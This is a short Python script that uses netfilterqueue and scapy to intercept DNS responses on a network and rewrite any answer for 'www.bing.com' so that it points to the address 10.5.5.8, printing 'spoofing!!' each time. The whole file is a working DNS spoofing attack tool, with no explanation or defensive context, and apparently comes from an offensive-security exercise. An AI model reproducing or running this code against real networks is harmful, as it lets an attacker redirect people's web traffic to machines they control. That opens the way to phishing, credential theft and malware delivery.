import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.bing.com' in qname:
            #print scapy_packet.show()
            print "spoofing!!"
            ans = scapy.DNSRR(rrname = qname, rdata = '10.5.5.8')
            scapy_packet[scapy.DNS].an = ans
            scapy_packet[scapy.DNS].ancount = 1


            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()

q = netfilterqueue.NetfilterQueue()
q.bind(0, process_packet)
q.run()


